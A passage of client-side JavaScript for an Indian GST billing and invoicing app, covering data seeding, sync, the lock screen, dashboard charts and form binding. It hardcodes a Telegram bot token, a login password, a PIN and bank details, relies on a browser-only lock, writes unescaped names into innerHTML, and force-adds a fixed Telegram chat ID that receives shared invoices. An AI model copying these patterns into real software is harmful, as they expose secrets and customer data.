        isSyncing = false;
      });
  };

  // Run initial sync
  window.triggerDatabaseSync();

  // Run periodic sync (1.5s on localhost, 10s on cloud/Netlify to conserve bandwidth)
  const isLocalhost = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
  const syncIntervalMs = isLocalhost ? 1500 : 10000;
  setInterval(window.triggerDatabaseSync, syncIntervalMs);

  // Sync automatically when window/tab is focused or returned to
  window.addEventListener("focus", () => {
    window.triggerDatabaseSync();
  });

  // Sync automatically when tab becomes visible
  document.addEventListener("visibilitychange", () => {
    if (document.visibilityState === "visible") {
      window.triggerDatabaseSync();
    }
  });

  // Throttled sync on user screen interaction
  let lastTouchSync = 0;
  document.addEventListener("touchstart", () => {
    const now = Date.now();
    if (now - lastTouchSync > 1200) {
      lastTouchSync = now;
      window.triggerDatabaseSync();
    }
  }, { passive: true });

  // Session Persistence calculation on page load
  const lastActiveTime = parseInt(localStorage.getItem("last_active_time") || "0", 10);
  const wasLocked = localStorage.getItem("app_locked") !== "false";
  const elapsedSeconds = (Date.now() - lastActiveTime) / 1000;

  if (wasLocked || elapsedSeconds > lockTimerSeconds) {
    isLocked = true;
    document.getElementById("lock-screen-overlay").classList.remove("hidden");
  } else {
    isLocked = false;
    document.getElementById("lock-screen-overlay").classList.add("hidden");
    const wrapper = document.querySelector('.dashboard-wrapper');
    if (wrapper) wrapper.classList.remove("blur-dashboard-wrapper");
  }

  // Autofill remembered credentials if enabled
  autofillRememberedCredentials();

  // Reset lock timer on activity
  resetAutolockTimer();
  ['mousemove', 'mousedown', 'keypress', 'touchstart', 'scroll'].forEach(evt => {
    document.addEventListener(evt, resetAutolockTimer, true);
  });

  // Default suggestions
  resetBillingForm();
  updateDashboardOverview();
  updateLiveDateTime();
  setInterval(updateLiveDateTime, 60000);

  // Mobile touch/click fast-response listener for Generate & Save Invoice
  const saveBtn = document.getElementById("btn-save-generate-invoice");
  if (saveBtn) {
    let lastTapTime = 0;
    saveBtn.addEventListener("touchend", (e) => {
      const now = Date.now();
      if (now - lastTapTime < 450) return;
      lastTapTime = now;
      if (e.cancelable) e.preventDefault();
      window.saveAndGenerateInvoiceOnly(saveBtn);
    }, { passive: false });
  }

  window.addEventListener('resize', () => {
    if (window.innerWidth > 768) {
      closeMobileSidebar();
    }
  });

  // Service Worker disabled to prevent file caching issues
  /*
  if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('./sw.js').then(reg => {
      reg.update();
    }).catch(err => {
      console.log('SW registration failed:', err);
    });
  }
  */
});

// --- LOCAL STORAGE DATABASES SEEDING ---
function seedDatabasesIfEmpty() {
  try {
    const storedSettings = JSON.parse(localStorage.getItem("settings") || "null");
    if (storedSettings && storedSettings.company && (storedSettings.company.name === "ANUDEEP KHADI BANDAR" || !storedSettings.company.name)) {
      localStorage.removeItem("settings");
    }
  } catch (err) {
    console.warn("Unable to parse saved settings:", err);
  }

  if (!localStorage.getItem("parties")) {
    const sampleParties = [
      {
        id: "party-1",
        type: "receiver",
        name: "DEVI FISHERIES LIMITED",
        company: "DEVI FISHERIES LIMITED",
        address: "LANKEVANIDIBBA\nREPALLE MANDAL\nGUNTUR\nAndhra Pradesh - 522264, India",
        gstin: "37AAACD7852Q1ZZ",
        state: "Andhra Pradesh",
        stateCode: "37",
        phone: "9848012345",
        updatedAt: new Date().toISOString()
      },
      {
        id: "party-2",
        type: "consignee",
        name: "DEVI FISHERIES LIMITED",
        company: "DEVI FISHERIES LIMITED",
        address: "LANKEVANIDIBBA\nREPALLE MANDAL\nGUNTUR\nAndhra Pradesh - 522264, India",
        gstin: "37AAACD7852Q1ZZ",
        state: "Andhra Pradesh",
        stateCode: "37",
        phone: "9848012345",
        updatedAt: new Date().toISOString()
      }
    ];
    localStorage.setItem("parties", JSON.stringify(sampleParties));
  }

  if (!localStorage.getItem("products")) {
    const sampleProducts = [
      {
        id: "prod-1",
        description: "RALLIMIN ADV + 15 KGs",
        hsn: "23099090",
        packSize: "15 KG",
        unit: "Bucket",
        rate: 3600.00,
        gstRate: 5,
        discount: 42.50,
        stock: 100,
        updatedAt: new Date().toISOString()
      },
      {
        id: "prod-2",
        description: "AQUA PROBIOTIC FEED SUPPLEMENT 1KG",
        hsn: "23099090",
        packSize: "1 KG",
        unit: "Can",
        rate: 850.00,
        gstRate: 5,
        discount: 10.00,
        stock: 100,
        updatedAt: new Date().toISOString()
      },
      {
        id: "prod-3",
        description: "ZEOLITE POWDER 25KG BAG",
        hsn: "28421000",
        packSize: "25 KG",
        unit: "Bag",
        rate: 450.00,
        gstRate: 12,
        discount: 5.00,
        stock: 100,
        updatedAt: new Date().toISOString()
      }
    ];
    localStorage.setItem("products", JSON.stringify(sampleProducts));
  }

  if (!localStorage.getItem("settings")) {
    const defaultSettings = {
      company: {
        name: "Aaryan Aqua Needs",
        tagline: "Quality Products for Better Aquaculture",
        address: "Door No: 10-13-94/42A REVENUE WARD 7\nAP HOUSING BOARD COLONY, REPALLE Village,\nREPALLE Mandal, Bapatla District, Pincode 522265",
        phones: "+91 74166 05652",
        email: "aaryanaquaneeds@gmail.com",
        website: "www.aaryan-aqua.com",
        gstin: "37ACNFA4687Q1ZC",
        state: "Andhra Pradesh",
        stateCode: "37"
      },
      bank: {
        name: "State Bank of India",
        accountName: "Aaryan aqua Needs",
        accountNo: "45413424177",
        ifsc: "SBIN0000911",
        branch: "Repalle"
      },
      upiId: "7386262139@upi",
      telegram: { token: "8800483005:AAFVRi7PthDe_Dl1Gk1wLYnvkVP580x2y_g", chatId: "6877857251, 7906132548" },
      security: { autolock: "120", username: "Aaryanaqua", password: "Aaryan@2024" },
      terms: [
        "We declare that this invoice shows the actual price of the goods described and that all particulars are true and correct."
      ]
    };
    localStorage.setItem("settings", JSON.stringify(defaultSettings));
  }

  if (!localStorage.getItem("invoices")) {
    localStorage.setItem("invoices", JSON.stringify([]));
  }
}

function loadAllDatabases() {
  try {
    productsDb = JSON.parse(localStorage.getItem("products") || "[]") || [];
    partiesDb = JSON.parse(localStorage.getItem("parties") || "[]") || [];
    invoicesDb = JSON.parse(localStorage.getItem("invoices") || "[]") || [];
    globalSettings = JSON.parse(localStorage.getItem("settings") || "{}") || {};
  } catch (err) {
    console.warn("Unable to parse persisted databases:", err);
    productsDb = [];
    partiesDb = [];
    invoicesDb = [];
    globalSettings = {};
  }

  // Seed default product catalog if empty so billing is never blocked
  if (!productsDb || productsDb.length === 0) {
    productsDb = [
      {
        id: "prod-1",
        description: "RALLIMIN ADV + 15 KGs",
        hsn: "23099090",
        packSize: "15 KG",
        unit: "Bucket",
        rate: 3600,
        gstRate: 5,
        discount: 42.5,
        stock: 98,
        updatedAt: new Date().toISOString()
      },
      {
        id: "prod-2",
        description: "AQUA PROBIOTIC FEED SUPPLEMENT 1KG",
        hsn: "23099090",
        packSize: "1 KG",
        unit: "Can",
        rate: 850,
        gstRate: 5,
        discount: 10,
        stock: 100,
        updatedAt: new Date().toISOString()
      },
      {
        id: "prod-3",
        description: "ZEOLITE POWDER 25KG BAG",
        hsn: "28421000",
        packSize: "25 KG",
        unit: "Bag",
        rate: 450,
        gstRate: 12,
        discount: 5,
        stock: 105,
        updatedAt: new Date().toISOString()
      }
    ];
    try { localStorage.setItem("products", JSON.stringify(productsDb)); } catch (e) {}
  }

  // Seed default party accounts if empty
  if (!partiesDb || partiesDb.length === 0) {
    partiesDb = [
      {
        id: "party-1",
        type: "receiver",
        name: "Sree Venkateswara Aqua Farms",
        address: "D.No 4-12, Main Road, Nizampatnam, Bapatla Dist, AP - 522314",
        gstin: "37AABCS1429B1Z2",
        phone: "9848012345",
        state: "Andhra Pradesh",
        stateCode: "37"
      },
      {
        id: "party-2",
        type: "consignee",
        name: "Coastal Fisheries Syndicate",
        address: "Plot 18, Harbor Road, Machilipatnam, Krishna Dist, AP - 521001",
        gstin: "37AABCC9876C1Z8",
        phone: "9848067890",
        state: "Andhra Pradesh",
        stateCode: "37"
      }
    ];
    try { localStorage.setItem("parties", JSON.stringify(partiesDb)); } catch (e) {}
  }

  if (!globalSettings.telegram) {
    globalSettings.telegram = { token: "8800483005:AAFVRi7PthDe_Dl1Gk1wLYnvkVP580x2y_g", chatId: "6877857251, 7906132548" };
  } else {
    if (!globalSettings.telegram.token) globalSettings.telegram.token = "8800483005:AAFVRi7PthDe_Dl1Gk1wLYnvkVP580x2y_g";
    if (!globalSettings.telegram.chatId || !globalSettings.telegram.chatId.includes("7906132548")) {
      if (globalSettings.telegram.chatId && globalSettings.telegram.chatId.trim()) {
        globalSettings.telegram.chatId = globalSettings.telegram.chatId + ", 7906132548";
      } else {
        globalSettings.telegram.chatId = "6877857251, 7906132548";
      }
      localStorage.setItem("settings", JSON.stringify(globalSettings));
    }
  }
  if (!globalSettings.security) {
    globalSettings.security = {};
  }
  if (!globalSettings.company) {
    globalSettings.company = {};
  }
  if (!globalSettings.bank) {
    globalSettings.bank = {};
  }

  if (globalSettings.company && (!globalSettings.company.address || globalSettings.company.address.includes("Paruchurivari") || globalSettings.company.address.includes("10-14-15/3"))) {
    globalSettings.company.address = "Door No: 10-13-94/42A REVENUE WARD 7\nAP HOUSING BOARD COLONY, REPALLE Village,\nREPALLE Mandal, Bapatla District, Pincode 522265";
  }
  if (globalSettings.company) {
    globalSettings.company.phones = "+91 74166 05652";
    globalSettings.company.website = "www.aaryan-aqua.com";
  }

  // Enforce new bank details for live update
  if (!globalSettings.bank) {
    globalSettings.bank = {};
  }
  globalSettings.bank.name = "State Bank of India";
  globalSettings.bank.accountName = "Aaryan aqua Needs";
  globalSettings.bank.accountNo = "45413424177";
  globalSettings.bank.ifsc = "SBIN0000911";
  globalSettings.bank.branch = "Repalle";

  if (!globalSettings.security) {
    globalSettings.security = {};
  }
  if (!globalSettings.security.username || globalSettings.security.username === "1234") {
    globalSettings.security.username = "Aaryanaqua";
  }
  if (!globalSettings.security.password || globalSettings.security.password === "1234" || globalSettings.security.pin === "1234") {
    globalSettings.security.password = "Aaryan@2024";
  }
  if (globalSettings.security.whatsappLockEnabled === undefined) {
    globalSettings.security.whatsappLockEnabled = true;
  }
  if (!globalSettings.security.whatsappPin) {
    globalSettings.security.whatsappPin = "2024";
  }
  if (!globalSettings.security.whatsappAutoLockMinutes) {
    globalSettings.security.whatsappAutoLockMinutes = "15";
  }

  // Enforce address updates (GUNTURU -> GUNTUR)
  let updatedParties = false;
  partiesDb.forEach(p => {
    if (p.address && p.address.includes("GUNTURU")) {
      p.address = p.address.replace(/GUNTURU/g, "GUNTUR");
      updatedParties = true;
    }
  });
  if (updatedParties) {
    localStorage.setItem("parties", JSON.stringify(partiesDb));
  }

  // Ensure all products have valid default stock if undefined, null, empty or <= 0
  let updatedProductsStock = false;
  productsDb.forEach(p => {
    const s = parseInt(p.stock, 10);
    if (p.stock === undefined || p.stock === null || p.stock === "" || isNaN(s) || s <= 0) {
      p.stock = 100;
      updatedProductsStock = true;
    }
  });
  if (updatedProductsStock) {
    try {
      localStorage.setItem("products", JSON.stringify(productsDb));
      if (typeof syncDatabaseToServer === 'function') {
        syncDatabaseToServer("products", productsDb);
      }
    } catch (e) {}
  }

  let updatedInvoices = false;
  invoicesDb.forEach(inv => {
    if (inv.buyer && inv.buyer.address && inv.buyer.address.includes("GUNTURU")) {
      inv.buyer.address = inv.buyer.address.replace(/GUNTURU/g, "GUNTUR");
      updatedInvoices = true;
    }
    if (inv.consignee && inv.consignee.address && inv.consignee.address.includes("GUNTURU")) {
      inv.consignee.address = inv.consignee.address.replace(/GUNTURU/g, "GUNTUR");
      updatedInvoices = true;
    }
  });
  if (updatedInvoices) {
    localStorage.setItem("invoices", JSON.stringify(invoicesDb));
  }

  try {
    localStorage.setItem("settings", JSON.stringify(globalSettings));
  } catch (err) {
    console.warn("Unable to persist settings:", err);
  }

  activeUsername = globalSettings.security?.username || "Aaryanaqua";
  activePassword = globalSettings.security?.password || globalSettings.security?.pin || "Aaryan@2024";
  lockTimerSeconds = parseInt(globalSettings.security?.autolock || "300", 10);
  if (Number.isNaN(lockTimerSeconds)) {
    lockTimerSeconds = 300;
  }
}

function reconcileProductInventoryStock(oldInvoice, newInvoice) {
  loadAllDatabases();
  let modified = false;

  if (oldInvoice && oldInvoice.items) {
    oldInvoice.items.forEach(oldItem => {
      const prod = productsDb.find(p => p.description === oldItem.description);
      if (prod) {
        prod.stock = Math.max(0, (parseInt(prod.stock, 10) || 0) + (parseInt(oldItem.quantity, 10) || 0));
        modified = true;
      }
    });
  }

  if (newInvoice && newInvoice.items) {
    newInvoice.items.forEach(newItem => {
      const prod = productsDb.find(p => p.description === newItem.description);
      if (prod) {
        prod.stock = Math.max(0, (parseInt(prod.stock, 10) || 0) - (parseInt(newItem.quantity, 10) || 0));
        modified = true;
      }
    });
  }

  if (modified) {
    try {
      localStorage.setItem("products", JSON.stringify(productsDb));
      syncDatabaseToServer("products", productsDb);
    } catch (err) {
      console.warn("Unable to save products db:", err);
    }
  }
}

function validateInvoiceStockAvailability(newItems, oldItems = []) {
  // Stock availability check must never block invoice creation
  return true;
}

function validateInvoicePaymentExceeds(invoice, grandTotal) {
  const status = invoice.paymentStatus || "Paid";
  if (status === "Partial") {
    const paid = parseFloat(invoice.paidAmount) || 0;
    const balance = parseFloat(invoice.balancePaid) || 0;
    const totalPaid = paid + balance;
    if (totalPaid > grandTotal) {
      alert(`❌ Error: Total paid amount (₹${totalPaid.toFixed(2)}) cannot exceed the invoice grand total (₹${grandTotal.toFixed(2)})!\nInitial Paid: ₹${paid.toFixed(2)}, Balance Paid: ₹${balance.toFixed(2)}.\n\nInvoice generation cancelled!`);
      return false;
    }
  }
  return true;
}

// --- ROUTING ENGINE ---
function setupRouting() {
  elements.navItems.forEach(btn => {
    btn.addEventListener("click", () => {
      const tabName = btn.getAttribute("data-tab");
      switchTab(tabName);
      closeMobileSidebar();
    });
  });
}

window.toggleMobileSidebar = function() {
  const wrapper = document.querySelector('.dashboard-wrapper');
  if (wrapper) {
    wrapper.classList.toggle('sidebar-open');
  }
};

window.closeMobileSidebar = function() {
  const wrapper = document.querySelector('.dashboard-wrapper');
  if (wrapper) {
    wrapper.classList.remove('sidebar-open');
  }
};

window.switchTab = function(tabName) {
  if (isLocked) return;
  if (typeof window.closeMobileSidebar === 'function') {
    window.closeMobileSidebar();
  }

  elements.navItems.forEach(btn => {
    if (btn.getAttribute("data-tab") === tabName) {
      btn.classList.add("active");
    } else {
      btn.classList.remove("active");
    }
  });

  elements.views.forEach(view => {
    if (view.id === `view-${tabName}`) {
      view.classList.remove("hidden");
    } else {
      view.classList.add("hidden");
    }
  });

  let title = tabName.charAt(0).toUpperCase() + tabName.slice(1);
  if (tabName === 'billing') title = 'GST Billing';
  if (tabName === 'history') title = 'Invoice History';
  elements.viewTitle.textContent = title;

  if (tabName === 'dashboard') {
    updateDashboardOverview();
  } else if (tabName === 'billing') {
    populateBillingSelectors();
    if (!currentInvoice.invoiceNo) {
      autoSuggestInvoiceNo();
    }
    calculateSummaryAndTable();
  } else if (tabName === 'history') {
    loadInvoicesHistoryTable();
  } else if (tabName === 'products') {
    loadProductsDatabaseTable();
  } else if (tabName === 'parties') {
    loadPartiesDatabaseLists();
  } else if (tabName === 'reports') {
    resetReportsView();
  } else if (tabName === 'settings') {
    loadSettingsFields();
  }
};

function updateLiveDateTime() {
  const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit' };
  elements.currentDatetime.textContent = new Date().toLocaleDateString('en-US', options);
}

// --- DASHBOARD LOADER & ANALYTICS CHARTS ---
let salesChartInstance = null;
let gstChartInstance = null;

function checkLowStockAlerts() {
  const alertPill = document.getElementById("live-stock-alert-pill");
  const alertText = document.getElementById("low-stock-count-text");
  if (!alertPill || !alertText) return;

  const lowStockItems = productsDb.filter(p => (parseInt(p.stock, 10) || 0) <= 5);
  if (lowStockItems.length > 0) {
    alertPill.classList.remove("hidden");
    alertText.textContent = `${lowStockItems.length} Low Stock Alert${lowStockItems.length > 1 ? 's' : ''}`;
  } else {
    alertPill.classList.add("hidden");
  }
}

function renderDashboardCharts() {
  const salesCanvas = document.getElementById("dashboard-sales-chart");
  const gstCanvas = document.getElementById("dashboard-gst-chart");
  if (!salesCanvas || !gstCanvas || typeof Chart === "undefined") return;

  const monthlyRevenue = {};
  const monthNames = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
  
  const now = new Date();
  for (let i = 5; i >= 0; i--) {
    const d = new Date(now.getFullYear(), now.getMonth() - i, 1);
    const key = `${monthNames[d.getMonth()]} ${d.getFullYear()}`;
    monthlyRevenue[key] = 0;
  }

  let totalCgst = 0, totalSgst = 0, totalIgst = 0;

  invoicesDb.forEach(inv => {
    if (inv.invoiceDate) {
      const parts = inv.invoiceDate.split('-');
      if (parts.length === 3) {
        const mIdx = parseInt(parts[1], 10) - 1;
        const yr = parts[0];
        if (mIdx >= 0 && mIdx < 12) {
          const key = `${monthNames[mIdx]} ${yr}`;
          if (monthlyRevenue.hasOwnProperty(key)) {
            monthlyRevenue[key] += parseFloat(inv.total || 0);
          }
        }
      }
    }

    const details = inv.details || {};
    totalCgst += parseFloat(details.totalCgst || 0);
    totalSgst += parseFloat(details.totalSgst || 0);
    totalIgst += parseFloat(details.totalIgst || 0);
  });

  const labels = Object.keys(monthlyRevenue);
  const dataValues = Object.values(monthlyRevenue);

  if (salesChartInstance) salesChartInstance.destroy();
  if (gstChartInstance) gstChartInstance.destroy();

  salesChartInstance = new Chart(salesCanvas, {
    type: 'bar',
    data: {
      labels: labels,
      datasets: [{
        label: 'Revenue (₹)',
        data: dataValues,
        backgroundColor: 'rgba(6, 182, 212, 0.65)',
        borderColor: '#06b6d4',
        borderWidth: 2,
        borderRadius: 6
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: { legend: { display: false } },
      scales: {
        y: { beginAtZero: true, grid: { color: 'rgba(255,255,255,0.05)' } },
        x: { grid: { display: false } }
      }
    }
  });

  const hasTaxData = (totalCgst + totalSgst + totalIgst) > 0;
  gstChartInstance = new Chart(gstCanvas, {
    type: 'doughnut',
    data: {
      labels: ['CGST', 'SGST', 'IGST'],
      datasets: [{
        data: hasTaxData ? [totalCgst, totalSgst, totalIgst] : [1, 1, 1],
        backgroundColor: hasTaxData ? ['#10b981', '#06b6d4', '#f59e0b'] : ['#334155', '#475569', '#64748b'],
        borderWidth: 0
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: { position: 'bottom', labels: { color: '#cbd5e1', font: { size: 11 } } }
      }
    }
  });
}

window.calculateMarginWidget = function() {
  const cost = parseFloat(document.getElementById("calc-cost-price")?.value || 0);
  const sell = parseFloat(document.getElementById("calc-sell-price")?.value || 0);
  const rate = parseFloat(document.getElementById("calc-gst-rate")?.value || 0);

  const gstResult = document.getElementById("calc-result-gst");
  const profitResult = document.getElementById("calc-result-profit");
  if (!gstResult || !profitResult) return;

  const gstAmt = (sell * rate) / 100;
  const netProfit = sell - cost;
  const marginPct = cost > 0 ? ((netProfit / cost) * 100).toFixed(1) : 0;

  gstResult.textContent = `₹ ${formatCurrency(gstAmt)}`;
  profitResult.textContent = `₹ ${formatCurrency(netProfit)} (${marginPct}%)`;
};

function updateDashboardOverview() {
  loadAllDatabases();
  elements.statTotalInvoices.textContent = invoicesDb.length;
  elements.statTotalProducts.textContent = productsDb.length;
  
  const uniqueParties = new Set(partiesDb.map(p => p.name)).size;
  elements.statTotalParties.textContent = uniqueParties;

  const totalRevenue = invoicesDb.reduce((sum, inv) => sum + parseFloat(inv.total), 0);
  elements.statTotalAmount.textContent = '₹ ' + formatCurrency(totalRevenue);

  checkLowStockAlerts();
  renderDashboardCharts();

  elements.dashboardRecentInvoicesBody.innerHTML = "";
  const recent = invoicesDb.slice().reverse().slice(0, 5);
  
  if (recent.length === 0) {
    elements.dashboardRecentInvoicesBody.innerHTML = `
      <tr>
        <td colspan="7" class="text-center text-muted">No invoices generated yet.</td>
      </tr>
    `;
    return;
  }

  recent.forEach(inv => {
    const details = inv.details || {};
    const status = details.paymentStatus || 'Paid';
    let badgeClass = 'badge-paid';
    if (status === 'Partial') badgeClass = 'badge-partial';
    if (status === 'Unpaid') badgeClass = 'badge-unpaid';

    const tr = document.createElement("tr");
    tr.innerHTML = `
      <td style="font-weight: 700; color: var(--primary-teal);">#${inv.invoiceNo}</td>
      <td>${formatInputDateString(inv.invoiceDate)}</td>
      <td style="font-weight: 600;">${inv.customerName}</td>
      <td class="text-center">${inv.itemsCount}</td>
      <td style="text-align: right; font-weight: 700;">₹ ${formatCurrency(inv.total)}</td>
      <td class="text-center"><span class="badge-status ${badgeClass}">${status}</span></td>
      <td class="actions-cell">
        <button class="action-btn edit" onclick="editSavedInvoice('${inv.id}')" title="Edit"><i class="fa-solid fa-pen-to-square"></i></button>
        <button class="action-btn print" onclick="printSavedInvoice('${inv.id}')" title="Print A4"><i class="fa-solid fa-print"></i></button>
        <button class="action-btn print" onclick="printSavedInvoiceThermal('${inv.id}')" title="Print Thermal POS"><i class="fa-solid fa-receipt"></i></button>
        <button class="action-btn share btn-whatsapp" onclick="shareInvoiceToWhatsApp('${inv.id}')" title="Share via WhatsApp"><i class="fa-brands fa-whatsapp"></i></button>
        <button class="action-btn share" onclick="shareInvoiceToTelegram('${inv.id}', this)" title="Share PDF to Telegram"><i class="fa-solid fa-paper-plane text-teal"></i></button>
        <button class="action-btn delete" onclick="deleteSavedInvoice('${inv.id}')" title="Delete"><i class="fa-solid fa-trash"></i></button>
      </td>
    `;
    elements.dashboardRecentInvoicesBody.appendChild(tr);
  });
}

function formatInputDateString(dateStr) {
  const d = new Date(dateStr);
  if (isNaN(d.getTime())) return dateStr;
  const options = { day: '2-digit', month: 'short', year: 'numeric' };
  return d.toLocaleDateString('en-GB', options).replace(/ /g, '-');
}

// --- BINDING GST BILLING FORM FIELDS ---
function bindBillingFormInputs() {
  const binds = [
    { el: elements.billInvoiceType, key: 'invoiceType' },
    { el: elements.billHeaderLogo, key: 'headerLogo' },
    { el: elements.billInvoiceNo, key: 'invoiceNo' },
    { el: elements.billInvoiceDate, key: 'invoiceDate' },
    { el: elements.billBuyerOrderNo, key: 'buyerOrderNo' },
    { el: elements.billBuyerOrderDate, key: 'buyerOrderDate' },
    { el: elements.billTransportMode, key: 'transportMode' },
    { el: elements.billDestination, key: 'destination' },
    { el: elements.billSupplyStateCode, key: 'supplyStateCode' },
    { el: elements.billPaymentStatus, key: 'paymentStatus' },
    { el: elements.billPaymentMode, key: 'paymentMode' },
    { el: elements.billPaidAmount, key: 'paidAmount', isFloat: true },
    { el: elements.billBalancePaid, key: 'balancePaid', isFloat: true },
    { el: elements.billPaymentDate, key: 'paymentDate' },

    { el: elements.billBuyerName, sub: 'buyer', key: 'name' },
    { el: elements.billBuyerAddress, sub: 'buyer', key: 'address' },
    { el: elements.billBuyerGstin, sub: 'buyer', key: 'gstin' },
    { el: elements.billBuyerPhone, sub: 'buyer', key: 'phone' },
    { el: elements.billBuyerState, sub: 'buyer', key: 'state' },
    { el: elements.billBuyerStateCode, sub: 'buyer', key: 'stateCode' },

    { el: elements.billConsigneeName, sub: 'consignee', key: 'name' },
    { el: elements.billConsigneeAddress, sub: 'consignee', key: 'address' },
    { el: elements.billConsigneeGstin, sub: 'consignee', key: 'gstin' },
    { el: elements.billConsigneePhone, sub: 'consignee', key: 'phone' },
    { el: elements.billConsigneeState, sub: 'consignee', key: 'state' },
    { el: elements.billConsigneeStateCode, sub: 'consignee', key: 'stateCode' }
  ];

  binds.forEach(b => {
    if (!b.el) return;
    const handleValChange = (e) => {
      let val = e.target.value;
      if (b.isInt) val = parseInt(val, 10) || 0;
      if (b.isFloat) val = parseFloat(val) || 0;

      if (!currentInvoice) currentInvoice = {};
      if (b.sub) {
        if (!currentInvoice[b.sub]) currentInvoice[b.sub] = {};
        currentInvoice[b.sub][b.key] = val;
      } else {
        currentInvoice[b.key] = val;
        if (b.key === 'destination') {
          currentInvoice.supplyPlace = val;
        }
      }
      calculateSummaryAndTable();
    };
    b.el.addEventListener("input", handleValChange);
    b.el.addEventListener("change", handleValChange);
  });

  window.syncBillingInputsToCurrentInvoice = function() {
    try {
      if (!currentInvoice) currentInvoice = {};
      if (elements.billInvoiceNo && elements.billInvoiceNo.value) currentInvoice.invoiceNo = elements.billInvoiceNo.value.trim();
      if (elements.billInvoiceDate && elements.billInvoiceDate.value) currentInvoice.invoiceDate = elements.billInvoiceDate.value;
      if (elements.billInvoiceType && elements.billInvoiceType.value) currentInvoice.invoiceType = elements.billInvoiceType.value;
      if (elements.billHeaderLogo && elements.billHeaderLogo.value) currentInvoice.headerLogo = elements.billHeaderLogo.value;
      if (elements.billBuyerOrderNo && elements.billBuyerOrderNo.value) currentInvoice.buyerOrderNo = elements.billBuyerOrderNo.value.trim();
      if (elements.billBuyerOrderDate && elements.billBuyerOrderDate.value) currentInvoice.buyerOrderDate = elements.billBuyerOrderDate.value;
      if (elements.billTransportMode && elements.billTransportMode.value) currentInvoice.transportMode = elements.billTransportMode.value;
      if (elements.billDestination && elements.billDestination.value) {
        currentInvoice.destination = elements.billDestination.value;
        currentInvoice.supplyPlace = elements.billDestination.value;
      }
      if (elements.billSupplyStateCode && elements.billSupplyStateCode.value) currentInvoice.supplyStateCode = elements.billSupplyStateCode.value;
      if (elements.billPaymentStatus && elements.billPaymentStatus.value) currentInvoice.paymentStatus = elements.billPaymentStatus.value;
      if (elements.billPaymentMode && elements.billPaymentMode.value) currentInvoice.paymentMode = elements.billPaymentMode.value;
      if (elements.billPaidAmount && elements.billPaidAmount.value !== "") currentInvoice.paidAmount = parseFloat(elements.billPaidAmount.value) || 0;
      if (elements.billBalancePaid && elements.billBalancePaid.value !== "") currentInvoice.balancePaid = parseFloat(elements.billBalancePaid.value) || 0;
      if (elements.billPaymentDate && elements.billPaymentDate.value) currentInvoice.paymentDate = elements.billPaymentDate.value;

      if (!currentInvoice.buyer) currentInvoice.buyer = {};
      if (elements.billBuyerName && elements.billBuyerName.value) currentInvoice.buyer.name = elements.billBuyerName.value.trim();
      if (elements.billBuyerAddress && elements.billBuyerAddress.value) currentInvoice.buyer.address = elements.billBuyerAddress.value.trim();
      if (elements.billBuyerGstin && elements.billBuyerGstin.value) currentInvoice.buyer.gstin = elements.billBuyerGstin.value.trim();
      if (elements.billBuyerPhone && elements.billBuyerPhone.value) currentInvoice.buyer.phone = elements.billBuyerPhone.value.trim();
      if (elements.billBuyerState && elements.billBuyerState.value) currentInvoice.buyer.state = elements.billBuyerState.value;
      if (elements.billBuyerStateCode && elements.billBuyerStateCode.value) currentInvoice.buyer.stateCode = elements.billBuyerStateCode.value;

      if (!currentInvoice.consignee) currentInvoice.consignee = {};
      if (elements.billConsigneeName && elements.billConsigneeName.value) currentInvoice.consignee.name = elements.billConsigneeName.value.trim();
      if (elements.billConsigneeAddress && elements.billConsigneeAddress.value) currentInvoice.consignee.address = elements.billConsigneeAddress.value.trim();
      if (elements.billConsigneeGstin && elements.billConsigneeGstin.value) currentInvoice.consignee.gstin = elements.billConsigneeGstin.value.trim();
      if (elements.billConsigneePhone && elements.billConsigneePhone.value) currentInvoice.consignee.phone = elements.billConsigneePhone.value.trim();
      if (elements.billConsigneeState && elements.billConsigneeState.value) currentInvoice.consignee.state = elements.billConsigneeState.value;
      if (elements.billConsigneeStateCode && elements.billConsigneeStateCode.value) currentInvoice.consignee.stateCode = elements.billConsigneeStateCode.value;

      if (!Array.isArray(currentInvoice.items)) currentInvoice.items = [];
    } catch (err) {
      console.warn("syncBillingInputsToCurrentInvoice safe catch:", err);
    }
  };

  window.calculateBillingItemNetVal = function() {
    const rate = parseFloat(elements.billItemRate ? elements.billItemRate.value : 0) || 0;
    const discount = parseFloat(elements.billItemDiscount ? elements.billItemDiscount.value : 0) || 0;
    const netVal = Math.max(0, rate - (rate * discount / 100));
    const netValEl = document.getElementById("bill-item-net-val");
    if (netValEl) {
      netValEl.value = rate > 0 ? `₹ ${formatCurrency(netVal)}` : "₹ 0.00";
    }
  };

  elements.billItemSelect.addEventListener("change", (e) => {
    const prodId = e.target.value;
    if (!prodId) {
      if (elements.billItemName) elements.billItemName.value = "";
      elements.billItemHsn.value = "";
      elements.billItemRate.value = "0";
      elements.billItemQty.value = "1";
      elements.billItemUnit.value = "Bucket";
      if (elements.billItemPack) elements.billItemPack.value = "";
      elements.billItemGstRate.value = "0";
      elements.billItemDiscount.value = "0";
      if (elements.billItemStockQty) elements.billItemStockQty.value = "—";
      calculateBillingItemNetVal();
      return;
    }
    if (prodId === '__custom__') {
      elements.billItemSelect.value = "";
      if (elements.billItemName) {
        elements.billItemName.value = "";
        elements.billItemName.focus();
      }
      elements.billItemHsn.value = "";
      elements.billItemRate.value = "0";
      elements.billItemQty.value = "1";
      elements.billItemUnit.value = "Bucket";
      if (elements.billItemPack) elements.billItemPack.value = "";
      elements.billItemGstRate.value = "0";
      elements.billItemDiscount.value = "0";
      if (elements.billItemStockQty) elements.billItemStockQty.value = "—";
      calculateBillingItemNetVal();
      return;
    }
    const prod = productsDb.find(p => p && (p.id === prodId || p.description === prodId));
    if (prod) {
      if (elements.billItemName) elements.billItemName.value = prod.description;
      elements.billItemHsn.value = prod.hsn || "";
      elements.billItemRate.value = prod.rate || "0";
      elements.billItemQty.value = "1";
      elements.billItemUnit.value = prod.unit || "Bucket";
      if (elements.billItemPack) elements.billItemPack.value = prod.packSize || "";
      elements.billItemGstRate.value = prod.gstRate || "0";
      elements.billItemDiscount.value = prod.discount || "0";
      if (elements.billItemStockQty) {
        elements.billItemStockQty.value = prod.stock !== undefined ? prod.stock : "—";
      }
